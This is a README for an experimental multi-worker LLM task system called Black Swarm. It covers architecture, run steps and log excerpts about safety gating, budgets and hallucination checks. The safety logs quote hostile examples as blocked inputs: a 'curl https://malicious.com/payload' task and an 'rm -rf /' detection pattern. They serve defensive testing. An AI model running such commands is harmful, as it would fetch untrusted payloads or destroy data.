# Black Swarm

Black Swarm is a parallel task execution system for LLM work. It is not a toy UI: it runs real worker processes, uses file locks to coordinate, calls a real API, and logs every step for auditability.

This README is evidence-first. The "Observable Facts" section includes direct excerpts from log files committed to this repo.

## TL;DR (what is actually in this repo)
- swarm.py: FastAPI /grind endpoint that proxies Groq.
- orchestrator.py: spawns N workers, manages kill switch and circuit breaker.
- worker.py: file locks, queue consumption, /grind calls, execution_log.jsonl output.
- safety_*.py: constitutional, network, workspace, and kill switch checks.
- control_panel.py: monitoring UI (Flask + SocketIO).
- action_logger.py: structured action log (jsonl + readable log).
- performance_tracker.py + performance_history.json: timing/quality metrics.
- swarm_enrichment.py + persona_memory.py: optional identity and reward modules.

## Architecture (actual modules)
```
+------------------+        +-----------------------+
| control_panel.py | <----> | action_log.jsonl/log  |
+--------+---------+        +-----------------------+
         |
         v
+------------------+   +---------------------+   +---------------------+
| queue.json       |-> | orchestrator.py     |-> | worker.py (N procs)  |
| task_locks/*     |   | kill switch + locks |   | locks + /grind calls |
+------------------+   +---------------------+   +----------+----------+
                                                         |
                                                         v
                                                 +----------------+
                                                 | swarm.py        |
                                                 | FastAPI /grind  |
                                                 +--------+--------+
                                                          |
                                                          v
                                                 +----------------+
                                                 | Groq API       |
                                                 +----------------+
```

## How it works (flow)
1. Add tasks to queue.json or use the CLI: python orchestrator.py add ...
2. Start the API server (uvicorn swarm:app --host 127.0.0.1 --port 8420).
3. Start the orchestrator with N workers (python orchestrator.py start N).
4. Workers acquire locks, call /grind, and append to execution_log.jsonl.
5. Control panel (optional) streams action_log.jsonl and exposes pause/kill controls.

## Running (local)
```
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt -r requirements-groq.txt
# control_panel.py also requires watchdog (pip install watchdog)

export GROQ_API_KEY=...

uvicorn swarm:app --host 127.0.0.1 --port 8420
python orchestrator.py start 4
python control_panel.py
```

Add tasks:
```
python orchestrator.py add task-1 grind --prompt "Your task" --min 0.05 --max 0.10
```

Optional config:
- SWARM_API_URL (default http://127.0.0.1:8420)
- DEFAULT_GROQ_MODEL (must be in config.py whitelist)
- WORKER_TIMEOUT_SECONDS

## Observable Facts (backed by logs in this repo)
These are direct excerpts from log files already checked in. No marketing, just outputs.

### 1) Parallel execution with safety gating (kernel_run.log)
File: kernel_run.log
```
[SAFETY] 210/210 tasks passed validation.
[RESUME] Found checkpoint with 133 completed tasks
============================================================
  UNIFIED GRIND SPAWNER (Groq)
============================================================
  Tasks:    210 total, 77 remaining
  Engine:   Groq (compound auto-selects model)
  Waves:    1 (parallel within each wave)
------------------------------------------------------------

[WAVE 1] Starting 74 tasks in parallel...
...
[1] DONE (1s)
...
[89] DONE (5s)
...
[88] DONE (8s)
[SAFETY] BLOCKED write to protected file: experiments/exp_20260203_220119_unified_session_89/grind_spawner_unified.py
```

### 2) Session timing and quality metrics (performance_history.json)
File: performance_history.json (excerpted metric lines)
```
    "timestamp": "2026-02-03T06:15:12.943754",
    "duration_seconds": 283.236662,
    "quality_score": 1.0,

    "timestamp": "2026-02-03T06:22:54.835440",
    "duration_seconds": 12.959601,
    "quality_score": 1.0,
```

### 3) Token/cost accounting and budget enforcement (api_audit.log)
File: api_audit.log
```
{"timestamp": "2026-02-03T22:42:06.798374", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.1-8b-instant", "cost": 4.160000000000001e-06, "input_tokens": 56, "output_tokens": 17}
{"timestamp": "2026-02-03T22:42:06.798752", "event": "CONSTITUTIONAL_VIOLATION", "user": "test_user", "role": "lan", "reason": "LAN users cannot execute requests matching: \\brm\\s+-rf\\s+/", "prompt_hash": "cf2a070fa8c07caa"}
{"timestamp": "2026-02-03T22:42:10.526871", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.3-70b-versatile", "cost": 0.017758929999999996, "input_tokens": 30049, "output_tokens": 38}
{"timestamp": "2026-02-03T22:42:15.023457", "event": "BUDGET_EXCEEDED", "user": "admin", "role": "admin", "remaining": 0.019124550000000004, "requested": 0.026945}
```

### 4) Safety policy enforcement (safety_audit.log)
File: safety_audit.log
```
{"timestamp": "2026-02-03T06:29:42.354872", "task": "Create a new feature in the workspace", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}
{"timestamp": "2026-02-03T06:29:42.355417", "task": "Fetch data from https://example.com", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}
{"timestamp": "2026-02-03T06:29:42.355688", "task": "curl https://malicious.com/payload", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": false, "reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}}, "passed": false, "blocked_reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}
```

### 5) Security audit cost and token usage (security_audit_run.log)
File: security_audit_run.log
```
============================================================
SECURITY SELF-AUDIT INITIATED
============================================================
Analyzing 7 security files...
Total context: ~52020 characters
Budget: $0.05

============================================================
AUDIT COMPLETE
============================================================

Cost: $0.0077
Tokens: 11358 in, 1309 out

Saved to: SECURITY_AUDIT_REPORT.md
```

### 6) Verification and hallucination detection (tool_operations.json)
File: tool_operations.json (excerpt)
```
  {
    "timestamp": "2026-02-03T09:28:34.352538",
    "session_id": 2,
    "type": "verification",
    "claimed_files": [
      "dashboard.html"
    ],
    "verified_files": [],
    "hallucination_detected": true,
    "discrepancy_count": 1,
    "source": "verification_system"
  },
```

## Evidence index (where to look next)
- kernel_run.log: parallel waves, task timing, safety blocks.
- performance_history.json: per-session duration and quality scores.
- api_audit.log: API call success/failure, tokens, cost, budget enforcement.
- safety_audit.log: constitutional/network/workspace blocks.
- security_audit_run.log: self-audit budget + token usage.
- tool_operations.json: verification and hallucination detection results.

## Note on provenance
Most narrative docs in this repo were generated by the swarm itself. Treat them as narrative, and use the evidence logs above for claims.

## Safety note
This repo is experimental. Run it in an isolated environment and review the safety modules before enabling any external access.

## Credits
- Josh (Human) - Architecture, vision, implementation
- Swarm (multi-agent) - Implementation and documentation
